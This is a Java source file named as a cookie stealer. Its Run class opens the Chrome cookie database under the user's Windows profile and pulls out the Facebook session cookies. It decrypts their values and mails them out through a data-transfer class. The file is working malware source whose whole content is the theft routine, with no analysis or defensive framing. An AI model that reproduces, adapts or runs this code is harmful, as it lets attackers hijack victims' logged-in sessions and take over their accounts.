package com.catthoor.cookiestealer;

import com.catthoor.cookiestealer.datatransfer.DataTransferrer;
import com.catthoor.cookiestealer.datatransfer.MailSender;
import com.catthoor.cookiestealer.encryption.ChromeCrypter;
import com.catthoor.cookiestealer.encryption.Crypter;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class Run {

    private Crypter<byte[], String> crypter;

    public Run() {
        crypter = new ChromeCrypter();
        String cookiesPath = getCookiesPath();
        String facebookCookies = getFacebookCookies(cookiesPath);
        sendMail(facebookCookies);
    }

    private String getCookiesPath() {
        String homeDir = System.getProperty("user.home");
        return homeDir + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies";
    }

    private String getFacebookCookies(String cookiesPath) {
        Connection connection;
        Statement statement;
        StringBuilder sb = new StringBuilder();
        try {
            Class.forName("org.sqlite.JDBC");
            connection = DriverManager.getConnection("jdbc:sqlite:" + cookiesPath);
            connection.setAutoCommit(false);
            statement = connection.createStatement();
            ResultSet resultSet = statement.executeQuery("SELECT * FROM cookies");
            while (resultSet.next()) {
                String hostKey = resultSet.getString("host_key");
                if (hostKey.equals(".facebook.com")) {
                    String name = resultSet.getString("name");
                    byte[] b = resultSet.getBytes(13);
                    sb.append("Name: ").append(name).append("\n");
                    sb.append("Value: ").append(crypter.decrypt(b)).append("\n\n");
                }
            }
            resultSet.close();
            statement.close();
            connection.close();
        } catch (Exception e) {
            sb.append(e.getMessage());
        }
        return sb.toString();
    }

    private void sendMail(String cookies) {
        DataTransferrer dataTransferrer = new MailSender();
        dataTransferrer.send(cookies);
    }

    public static void main(String[] args) {
        new Run();
    }
}
